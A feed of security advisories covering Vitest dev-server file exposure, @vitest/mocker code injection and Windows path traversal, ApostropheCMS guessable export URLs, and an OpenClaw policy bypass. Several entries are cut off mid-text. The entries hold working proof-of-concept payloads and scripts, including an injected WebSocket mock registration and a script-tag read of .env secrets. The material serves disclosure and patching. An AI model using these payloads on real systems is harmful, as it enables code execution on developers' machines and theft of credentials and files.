items.title: [@vitest/ui] Vitest: Servers misapply `server.fs.deny`, serving `.env`, private keys, `.git`, and the API token file
items.summary: SummaryIn Vitest 5, Vite's server.fs.deny is not applied as intended on Vitest's dev servers. Depending on the server, files that Vite refuses to serve by default (such as .env, private keys and certificates, .npmrc, and .git) or Vitest's own API token file (.vitest-secret-token) can be read over plain HTTP by a client that can reach the server. In Browser Mode with test.projects, a malicious website can also read .env values through the developer's browser.This only applies when Vitest runs an HTTP server, which happens with the UI (--ui), Browser Mode, or api enabled. Plain vitest and vitest run don't listen on any port and are not affected. The fix ships in vitest, and @vitest/ui and @vitest/browser are listed because they are what enables the affected setups. Both pin vitest to the same version as a peer dependency, so upgrading either one also requires the patched vitest. Users who enable api without @vitest/ui or @vitest/browser are also affected and should upgrade vitest.DetailsVitest 5 adds its API token file to server.fs.deny, but neither server ended up with the intended list. That's because of two Vite behaviors. Vite applies its default deny list only when server.fs.deny is unset, and it compiles the list into a matcher during config resolution, so later changes to the array have no effect.setuplistening serverVite's default deny list.vitest-secret-tokenplain vitest / vitest runnonenot reachablenot reachable--ui or apirootdeniedserved (fallback location only)Browser Mode, single projectroot (also the browser server)deniedserved (fallback location only)Browser Mode with test.projectseach browser project's serverserveddeniedProject servers set deny: ['.vitest-secret-token'] from a config() hook, which replaces Vite's defaults. A project server listens on a port in Browser Mode with test.projects, so in that setup a request like GET /.env?raw returns the file. A plain GET /.env is also served as text/javascript, so a malicious page can include it with <script src="http://localhost:<port>/.env">. A classic script include needs no CORS, and each dotenv line whose value is valid JavaScript (a quoted string, number, or boolean) runs as a global assignment the page can read. A syntax error anywhere in the file, such as a # comment, keeps the whole script from running. The same missing defaults also loosen Browser Mode's file-access checks for server.readFile/writeFile/removeFile, screenshots, and traces.The root server adds the token entry after Vite has compiled the matcher, so the entry is never applied. The token file normally lives in the per-user data directory, which is outside server.fs.allow. When that directory can't be written, for example in a container whose user has no writable HOME, Vitest falls back to <workspaceRoot>/node_modules/.vitest/.vitest-secret-token, which the root server then serves. The token authenticates the UI, /__vitest_attachment__, and the API WebSocket, whose RPC can write and rerun test files when api.allowWrite/api.allowExec are enabled.ImpactInformation disclosure from the Vitest dev server, and with the token, privileged API access.From a malicious website, in Browser Mode with test.projects: while the browser server runs, any page the developer visits can read .env values that are valid JavaScript, through a classic <script> include. This works when the file consists of KEY="value" lines. An unquoted value causes a runtime error that stops the script at that line, so only the lines before it leak. A syntax error anywhere in the file, such as a # comment line or an export prefix, prevents the script from running at all. Recent Chrome versions may ask for Local Network Access permission first. fetch and XHR reads from other websites are still blocked by Vite's default CORS policy, and Vite's Host check blocks DNS rebinding. That CORS policy does allow localhost origins, so a page served from another local dev server could read full files. The token file can't be read through a classic <script>, because a bare token isn't valid JavaScript.With local access or developer-set network exposure (such as api.host or browser.api.host, port forwarding, or a published container port): full file contents are readable over plain HTTP, including the token file when it's in the fallback location.Only the machine running Vitest is exposed, while it runs one of the setups above. Applications built or deployed from the project aren't affected.The fix is in vitest <PATCHED>. Vitest 4 and earlier are unaffected. They don't persist an API token, and they don't override server.fs.deny.WorkaroundSet server.fs.deny explicitly in the root Vitest config, including Vite's default list for your Vite version and the token file. For Vite 8.3:export default defineConfig({  server: {    fs: {      deny: [        '.env',        '.env.*',        '*.{crt,pem,key,p12,pfx,cer,der}',        '.npmrc',        '.yarnrc.yml',        '**/.git/**',        '.vitest-secret-token',      ],    },  },})Referencesh

items.title: [@vitest/mocker] Vitest: Code injection via unauthenticated manual mock registration
items.summary: Summary@vitest/mocker's interceptorPlugin accepts mock registrations on Vite's dev-server WebSocket with no authentication, and interpolates the mock's url into generated module source without escaping. A client that can reach the dev server can make it serve arbitrary JavaScript in place of any project module, which then runs in the developer's browser on the dev-server origin.Same handler and same unauthenticated caller as GHSA-82fw-gwwq-j7x9; that fix (8ff9b9a9efca7c6cfd5243569440de8d7a33aec4, PR #10972) hardened only the redirect branch and left the manual branch reaching the unescaped generator.PatchesFixed in @vitest/mocker 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. createManualModuleSource now serializes the module URL and the export names with JSON.stringify, so a registered mock cannot change the generated code.Projects that call mockerPlugin() or interceptorPlugin() directly need @vitest/mocker 4.1.12 or 5.0.3.Detailspackages/mocker/src/utils.ts:6-9 builds module source by string interpolation:export function createManualModuleSource(moduleUrl: string, exports: string[], globalAccessor = '"__vitest_mocker__"'): string {  const source = `const __factoryModule__ = await globalThis[${globalAccessor}].getFactoryModule("${moduleUrl}");`moduleUrl lands inside a double-quoted JavaScript string with no escaping or validation.packages/mocker/src/node/interceptorPlugin.ts:66-93 feeds it straight from the socket:configureServer(server) {  if (options.registerWebSocketEvents === false) { return }  server.ws.on('vitest:interceptor:register', (event: MockedModuleSerialized) => {    if (event.type === 'manual') {      const module = ManualMockedModule.fromJSON(event, async () => {        const keys = await getFactoryExports(event.url)        return Object.fromEntries(keys.map(key => [key, null]))      })      registry.add(module)                       // no validation of `id` or `url`    }    else {      if (event.type === 'redirect') { /* fs allowlist check added in #10972 */ }event.id chooses which module is hijacked; event.url is what gets interpolated. The load hook (interceptorPlugin.ts:30-44) then returns createManualModuleSource(mock.url, exports, accessor) for that id.With url = 'x"); globalThis.ARES_INJECTED = 1; void("' a request for /src/app.js is answered with valid, executable JavaScript:const __factoryModule__ = await globalThis["__vitest_mocker__"].getFactoryModule("x"); globalThis.ARES_INJECTED = 1; void("");getFactoryExports (interceptorPlugin.ts:103-117) also takes the export-name array from the same socket, and those names are interpolated unescaped too — but each name is emitted into __factoryModule__["X"], export { __0 as "X" } and resolvedModule["X"], and no payload tested parses in all three positions (all nine candidates were rejected by the parser). It is a hardening gap, not a second usable vector; url is the exploited one.Who can reach the socket. Vite 8 answers HTTP 400 to any HMR upgrade carrying an Origin header it does not own, so a cross-origin browser page cannot open it — the PoC asserts this for https://evil.example and http://localhost:3000. The reachable attacker is a non-browser WebSocket client with access to the dev server's port, the same prerequisite under which GHSA-82fw-gwwq-j7x9 was published.PoCpoc/mocker-manual-mock-injection/ — repro.sh (exit 0 = vulnerable), poc.mjs, expected.txt, env.txt. Everything lives under a fresh mktemp directory deleted on exit, the dev server binds to 127.0.0.1 on an ephemeral port, no external host is contacted, and the payload is only inspected as text — the script never evaluates it.Environment: commit 9e1166959e14bd32298d8a0e85352431c769ec7a, @vitest/mocker 5.0.0, Node v22.23.1, Vite 8.0.11, ws 8.21.3, pnpm 11.24.0, Linux x86_64.git clone https://github.com/vitest-dev/vitest && cd vitestgit checkout 9e1166959e14bd32298d8a0e85352431c769ec7apnpm install && pnpm buildREPO=$(pwd) bash /path/to/poc/mocker-manual-mock-injection/repro.shRequired configuration — the public setup documented in packages/mocker/EXPORTS.md, which the harness reproduces (mockerPlugin() wires interceptorPlugin the same way):import { interceptorPlugin } from '@vitest/mocker/node'export default defineConfig({ plugins: [interceptorPlugin()] })   // or mockerPlugin()The attack is one WebSocket message to ws://<host>:<port>/ with subprotocol vite-hmr:{ "type": "custom", "event": "vitest:interceptor:register",  "data": { "type": "manual", "raw": "", "id": "<abs path of a served module>",            "url": "x\"); globalThis.ARES_INJECTED = 1; void(\"" } }then answering the server's vitest:interceptor:resolve with {"type":"custom","event":"vitest:interceptor:resolved","data":{"url":"<same url>","keys":["a"]}}. The module id can be obtained from the same socket via vitest:mocks:resolveId when mockerPlugin() is used.Observed output:PASS  precondition: Vite rejects a WebSocket upgrade sent with Origin https://evil.example  result=400PASS  preconditio

items.title: [@vitest/mocker] Vitest: Windows backslash traversal bypasses the @vitest/mocker redirect allowlist fix
items.summary: SummaryThe path traversal fix released for GHSA-82fw-gwwq-j7x9 can be bypassed on Windows by using a backslash in the redirect URL pathname.The fixed code joins an attacker-controlled URL pathname with the Vite root using node:path/posix, then passes that string to Vite's file allowlist check. On Windows, a value such as C:/project/root/..\secret.txt retains ..\ during the POSIX join and begins with the allowed root, so the allowlist accepts it. The later readFile() call uses Windows filesystem semantics, where the backslash is a path separator, and reads the sibling file outside the configured root.I reproduced the issue with the published @vitest/mocker packages in both fixed release lines:@vitest/mocker@4.1.11@vitest/mocker@5.0.0The current main source at commit 2ce29d5fa758046e5453bd92b8ed6c9da9709bb5 has the same behavior.PatchesFixed in @vitest/mocker 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. The redirect registration now converts backslashes in the URL pathname to forward slashes before it joins the pathname with the root, so ..\ resolves the same as ../ and the allowlist check rejects it.Relationship to GHSA-82fw-gwwq-j7x9This is a bypass of the accepted fix, not a separate unrelated path. It uses the same vitest:interceptor:register redirect registration and the same file-reading sink as the original advisory. A forward-slash traversal is rejected after the fix, while the equivalent Windows backslash traversal is accepted.The original advisory marks 4.1.11 and 5.0.0-rc.2 as patched. The newly affected ranges introduced by the incomplete fix are therefore:4.1.11>=5.0.0-rc.2, <5.0.3Older affected releases remain covered by GHSA-82fw-gwwq-j7x9.Root causepackages/mocker/src/node/interceptorPlugin.ts imports join from node:path/posix. Redirect registration currently performs the equivalent of:const redirect = join(server.config.root, redirectUrl.pathname)if (!isFileLoadingAllowed(server.config, redirect)) returnevent.redirect = redirectThe registered value later reaches:readFile(mock.redirect, 'utf-8')Vite's allowlist check expects a normalized absolute filesystem path. On Windows, POSIX joining does not normalize backslashes, but readFile interprets them as separators. The check and the sink therefore interpret the same string differently.The authenticated browser RPC fallback in packages/browser/src/node/rpc.ts is not affected: it joins the path with pathe, which converts backslashes to forward slashes before the access check. The reproduction below targets the public mocker WebSocket registration path.Preconditions and impactA client that can reach a Vite server using the public mockerPlugin or standalone interceptorPlugin WebSocket registration can register a redirect mock. On Windows, the client can then request the registered module and read a file outside server.fs.allow that the Vitest/Vite process account can access. Vitest Browser Mode does not register these WebSocket handlers in the affected versions.The reproduction uses an unauthenticated Vite HMR WebSocket connection and a normal HTTP GET. It does not call the plugin's internal transform API. The practical network reachability is the same deployment precondition described by the original advisory; default loopback-only development servers are correspondingly less exposed.ReproductionTested on GitHub-hosted Windows Server 2025 with Node.js 22. The test creates only temporary synthetic files: a Vite root directory and a sibling secret.txt containing a canary.Install dependencies for either affected line:npm install @vitest/mocker@4.1.11 vite@7.1.5 ws@8.18.3# ornpm install @vitest/mocker@5.0.0 vite@7.1.5 ws@8.18.3node poc.mjspoc.mjs:import { mkdir, writeFile } from 'node:fs/promises'import { join } from 'node:path'import { tmpdir } from 'node:os'import { randomUUID } from 'node:crypto'import { interceptorPlugin } from '@vitest/mocker/node'import { createServer } from 'vite'import { WebSocket } from 'ws'const base = join(tmpdir(), `vitest-path-${randomUUID()}`)const root = join(base, 'root')const secret = join(base, 'secret.txt')await mkdir(root, { recursive: true })await writeFile(secret, 'SYNTHETIC_OUTSIDE_ROOT_CANARY')const server = await createServer({  root,  configFile: false,  logLevel: 'silent',  server: { fs: { allow: [root] } },  plugins: [    {      name: 'validation:virtual-modules',      enforce: 'pre',      resolveId(id) {        if (id === '/control' || id === '/bypass') return id      },    },    interceptorPlugin(),  ],})await server.listen()const port = new URL(server.resolvedUrls.local[0]).portconst baseUrl = server.resolvedUrls.local[0]function register(id, redirect) {  return new Promise((resolve, reject) => {    const socket = new WebSocket(`ws://localhost:${port}`, 'vite-hmr')    const timer = setTimeout(() => reject(new Error('registration timeout')), 5000)    socket.on('message', (raw) => {      let message      try { message = JSON.parse(raw.toString()) } catch { return }      if (message.t

items.title: [@apostrophecms/import-export] ApostropheCMS: Exposure of Sensitive Information via predictable export filenames
items.summary: SummaryWhen a user exports content through @apostrophecms/import-export, the module copies the generated archive into uploadfs at /exports/ and returns a public URL under /uploads/exports/. The filename is fully deterministic: site shortName, document type, a YYYYMMDDHHmmss timestamp, and the format extension. There is no secret token.Anyone who can guess that path can download the archive with a normal unauthenticated HTTP GET while the file is still present (10 minutes by default, longer if the site raises importExport.export.expiration). That is a different model from attachment URLs, which rely on hard-to-guess IDs.Sites that disable export, store uploads on a private backend with no anonymous read, or serve /uploads only behind authentication are not hit by the network download step—but the predictable naming is still a design flaw for the default local/public uploadfs layout.Import-only workflows and imports themselves are out of scope; this is specific to the export download URL.Affected configurationsAll of the following must apply:The @apostrophecms/import-export module is enabled and export is allowed for at least one page or piece type, andExport files are served the usual way: copyIn to /exports/… and delivery via the public uploads URL (default local uploadfs or any deployment that exposes the same path without per-file auth).If export is turned off per type or globally, or /uploads is not world-readable, an anonymous attacker cannot pull the file over HTTP—but a co-resident attacker with filesystem or bucket listing access would still see guessable names.RemediationPut a high-entropy component in the export filename (e.g. apos.util.generateId()), orStop publishing exports on a world-readable URL—serve downloads through an authenticated route and keep objects in a private prefix until then, orDocument that importExport.export.expiration must stay short and treat /uploads/exports/ as sensitive (weak on its own).DetailsTechnical detailsexportFile() in packages/import-export/lib/methods/export.js builds the name and publishes it:const date = dayjs().format('YYYYMMDDHHmmss');const filename = `${self.apos.shortName}-${req.body.type.toLowerCase()}-export-${date}${format.extension}`;const downloadPath = path.join('/exports', filename);await copyIn(filepath, downloadPath);The admin UI sends type as the module name (e.g. article), which matches the filename. The download URL is only shown in the exporter’s notification; nothing binds the HTTP request to that user afterward. After expiration (default 1000 * 60 * 10 ms) a timer deletes the object from uploadfs, which limits exposure but leaves a brute-forceable window.Proof of conceptThe script boots a minimal Apostrophe app with import-export, performs an export as the task user, then downloads the same archive without a session—first by path guessing, then with raw fetch. It exits non-zero on failure.Requirements: Node 18+, pnpm install at the monorepo root (so apostrophe and @apostrophecms/import-export resolve). Set APOSTROPHE_ROOT to the checkout path.#!/usr/bin/env bashset -euo pipefail# --- config ---APOSTROPHE_ROOT="${APOSTROPHE_ROOT:-}"if [[ -z "${APOSTROPHE_ROOT}" || ! -f "${APOSTROPHE_ROOT}/packages/import-export/package.json" ]]; then  echo "Set APOSTROPHE_ROOT to your apostrophe monorepo checkout." >&2  exit 1fiexport APOS_TEST_DB_PROTOCOL=sqlitecd "${APOSTROPHE_ROOT}/packages/import-export"# --- run embedded PoC (no extra repo files) ---node <<'NODE'const assert = require('node:assert/strict');const path = require('node:path');const dayjs = require('dayjs');const t = require('apostrophe/test-lib/util.js');(async () => {  let apos;  const shortName = 'poc-export-site';  const exportsPath = (root) => path.join(root, 'public/uploads/exports');  try {    apos = await t.create({      root: module,      testModule: true,      shortName,      modules: {        '@apostrophecms/express': {          options: { session: { secret: 'poc-export-secret' } }        },        '@apostrophecms/import-export': {          options: {            importExport: { export: { expiration: 60 * 1000 } }          }        },        '@apostrophecms/uploadfs': { options: { storage: 'local' } },        'home-page': { extend: '@apostrophecms/page-type' },        article: {          extend: '@apostrophecms/piece-type',          options: { alias: 'article', autopublish: true }        }      }    });    const importExport = apos.modules['@apostrophecms/import-export'];    const req = apos.task.getReq();    await apos.article.insert(req, {      ...apos.article.newInstance(),      title: 'GHSA PoC confidential piece'    });    const articles = await apos.article.find(req).toArray();    assert.ok(articles.length > 0);    const exportStartedAt = dayjs();    req.body = {      _ids: articles.map((d) => d._id),      formatName: 'gzip',      type: 'article'    };    const { url: downloadUrl } = await importExport.export(req, apos.article);    const fileName = path.basename(downloadUrl);

items.title: [openclaw] OpenClaw: Browser CDP discovery could accept blocked WebSocket URLs
items.summary: SummaryBrowser CDP discovery could accept blocked WebSocket URLs. In affected versions, a lower-trust caller or configured input path could reach network destinations that should have been blocked by OpenClaw policy.This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.ImpactWhen the affected feature is enabled and reachable, this could reach network destinations that should have been blocked by OpenClaw policy. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.Patched VersionsThe first stable patched version is 2026.6.6.MitigationsUpgrade to a patched OpenClaw release when one is listed. Before upgrading, restrict the affected feature to trusted operators or disable it when it is not needed. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.Referenceshttps://github.com/openclaw/openclaw/security/advisories/GHSA-3x84-qq85-fj65https://nvd.nist.gov/vuln/detail/CVE-2026-62197https://www.vulncheck.com/advisories/openclaw-policy-bypass-via-cdp-discoveryhttps://github.com/advisories/GHSA-3x84-qq85-fj65
